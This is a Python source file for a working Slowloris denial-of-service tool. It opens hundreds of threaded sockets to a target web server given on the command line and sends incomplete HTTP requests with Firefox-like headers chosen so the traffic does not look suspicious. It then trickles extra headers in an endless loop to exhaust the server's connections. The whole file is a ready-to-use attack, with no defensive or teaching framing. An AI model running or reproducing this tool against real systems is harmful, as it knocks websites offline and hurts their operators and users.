import socket
import logging
import argparse

from sys import exit, stdout
from time import sleep
from random import randint
from queue import Queue
from threading import Thread

logging.basicConfig(level=logging.INFO)
logger = logging.getLogger(__name__)


class Worker(Thread):
    '''Thread executing tasks from a given tasks queue'''
    def __init__(self, tasks):
        Thread.__init__(self)
        self.tasks = tasks
        self.daemon = True
        self.start()

    def run(self):
        '''
        `run` overrides the Thread class and will be the code run by the thread, it takes functions from the `tasks` queue and calls them with the arguments provided
        '''
        while True:
            # Retrive the function and arguments from the `tasks` queue
            func, args, kargs = self.tasks.get()

            # Try to run it, outputs exception if failed
            try:
                func(*args, **kargs)
            except Exception as e:
                print(e)

            # Removes the element from the queue
            self.tasks.task_done()


class ThreadPool:
    '''Pool of threads consuming tasks from a queue'''
    def __init__(self, num_threads):
        self.tasks = Queue(num_threads)
        for _ in range(num_threads):
            Worker(self.tasks)

    def add_task(self, func, *args, **kargs):
        '''Add a task to the queue'''
        self.tasks.put((func, args, kargs))

    def wait_completion(self):
        '''Wait for completion of all the tasks in the queue'''
        self.tasks.join()


class SlowLoris:
    # These are legit Firefox headers so the connections does not appear suspicious
    headers = [
        'User-Agent: Mozilla/5.0 (X11; Linux x86_64; rv:49.0) Gecko/20100101 Firefox/49.0',
        'Accept-Language: en-US,en;q=0.5'
    ]

    def __init__(self, target, sock_count, thread_count=1):
        '''
        A SlowLoris attack class which handles creation and management of sockets with thread pool feature
        Arguments:
        - `target` , a (host, port) set specifying the destination
        - `sock_count` , the number of socket connections to make to the target
        - `thread_count` , the maximum number of threads in the thread pool
        '''
        self.sockets = []
        self._workers = []

        logger.info('Attacking {} with {} sockets'.format(target[0], sock_count))
        self._sock_count = sock_count
        self.target = target

        logger.info('Creating a thread pool of {} threads'.format(thread_count))
        self.pool = ThreadPool(thread_count)

    def connect_sockets(self):
        '''
        Creates the socket connections specified in `_sock_count` by adding the task to the queue and blocks until all sockets are created
        '''
        logger.info('Creating {} sockets'.format(self._sock_count))
        for _ in range(self._sock_count):
            # Addding the task to the thread pool queue
            self.pool.add_task(self.init_socket)
        self.pool.wait_completion()
        logger.info('Done creating {} sockets'.format(len(self.sockets)))

    def init_socket(self):
        '''
        Creates a single socket to the target and stores the socket in the `sockets` list to be managed later
        '''
        try:
            # Create and connect the socket
            sock = socket.socket(socket.AF_INET, socket.SOCK_STREAM)
            sock.settimeout(4)
            sock.connect(self.target)

            # Send the headers of the HTTP request
            sock.send('GET /?{} HTTP/1.1\r\n'.format(randint(0, 50000)).encode('utf-8'))
            for header in self.headers:
                sock.send('{}\r\n'.format(header).encode('utf-8'))

            # Note: a CLRF is not sent to maintain the connection
            logger.debug('Connection established for {} on port {}'.format(self.target[0], self.target[1]))
            if sock:
                # Appending the lists of sockets
                self.sockets.append(sock)
        except socket.error:
            # Unable to establish connection, return gracefully
            logger.debug('Losing connection at {} sockets'.format(len(self.sockets)))
            return

    def __enter__(self):
        '''
        To enable the `with ... as ...` construction of this class
        '''
        return self

    def __exit__(self, *args):
        '''
        Closing the socket connections for garbage collection
        '''
        for sock in self.sockets:
            sock.close()

    def keep_alive(self):
        '''
        Slowly sending data to the server to maintain a connection and starve it's resources
        '''
        for sock in self.sockets:
            try:
                sock.send('X-a: {}\r\n'.format(randint(1, 50000)).encode('utf-8'))
            except socket.error:
                self.sockets.remove(sock)
        for _ in range(self._sock_count - len(self.sockets)):
            logger.info('Recreating socket...')
            self.pool.add_task(self.init_socket)
        self.pool.wait_completion()
        sleep(15)


def main():
    # Parsing the arguments
    parser = argparse.ArgumentParser()
    parser.add_argument('host')
    parser.add_argument('--sock_count', default=200, type=int)
    parser.add_argument('--thread_count', default=5, type=int)
    parser.add_argument('--port', default=80, type=int)
    args = parser.parse_args()

    # Initialize the SlowLoris object
    with SlowLoris((args.host, args.port), args.sock_count, args.thread_count) as slowloris:
        slowloris.connect_sockets()

        # Keep all the sockets alive to starve the web server
        while True:
            slowloris.keep_alive()


if __name__ == '__main__':
    try:
        main()
    except KeyboardInterrupt:
        logger.info('Interrupt received, shutting down...')
